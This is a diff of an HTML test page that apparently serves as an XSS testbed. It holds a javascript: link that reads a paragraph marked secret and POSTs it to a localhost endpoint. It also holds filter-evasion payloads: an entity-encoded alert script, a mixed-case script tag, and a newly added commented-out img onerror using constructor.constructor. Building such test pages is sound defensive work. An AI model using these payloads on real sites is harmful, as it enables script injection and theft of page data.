@@ -2,12 +2,13 @@
 <html>
 
 <head>
-	<script src="tsc.js"></script>
 	<title>Page Title</title>
 
 </head>
 
 <body>
+
+	<div id="div1"></div>
 
 	<p name="name">This is a secret.</p>
 
@@ -40,6 +41,9 @@
 	<a
 		href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)">ClickMeFor$</a>
 
+	<img id='img2' src=0>
+	<!-- <img id='img1' src=0 onerror="[].constructor.constructor('alert'+'(1)')()"> -->
+
 	<button id="b1"> click </button>
 
 	<!-- <script>&#97;&#108;&#101;&#114;&#116;&#96;&#97;&#36;&#123;&#49;&#125;&#96;</script> -->
@@ -67,6 +71,12 @@
 			}
 		});
 	</sCriPt>
+
+	<script>
+		document.querySelector('#div1').append('<p>test</p>')
+	</script>
+
+	<script src="./tsc.js"></script>
 </body>
 
 </html>
